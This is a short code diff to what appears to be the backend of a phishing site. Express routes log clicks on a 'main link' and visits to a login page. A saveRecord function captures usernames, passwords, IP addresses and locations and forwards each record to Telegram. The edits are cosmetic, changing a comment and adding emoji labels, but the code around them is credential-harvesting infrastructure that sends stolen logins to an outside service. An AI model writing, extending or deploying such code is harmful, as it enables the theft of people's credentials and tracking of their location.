@@ -94,7 +94,7 @@ async function saveRecord(type, username = null, password = null, address = null
 
         console.log(`✅ SAVED: ${type} | Location: ${location}`);
 
-        // Send notification for EVERY activity (including pure page visits)
+        // Send notification immediately for every activity
         await sendTelegramNotification({ type, username, password, address, ip, location, timestamp });
 
     } catch (err) {
@@ -105,13 +105,13 @@ async function saveRecord(type, username = null, password = null, address = null
 // ==================== ROUTES ====================
 app.get('/', async (req, res) => {
     const ip = getRealIP(req);
-    await saveRecord('Page Visit', null, null, 'Main Link Clicked', ip);
+    await saveRecord('Page Visit', null, null, '🔗 Main Link Clicked', ip);
     res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
 app.get('/login.html', async (req, res) => {
     const ip = getRealIP(req);
-    await saveRecord('Page Visit', null, null, 'Login Page Opened', ip);
+    await saveRecord('Page Visit', null, null, '🔑 Login Page Opened', ip);
     res.sendFile(path.join(__dirname, 'public', 'login.html'));
 });
 
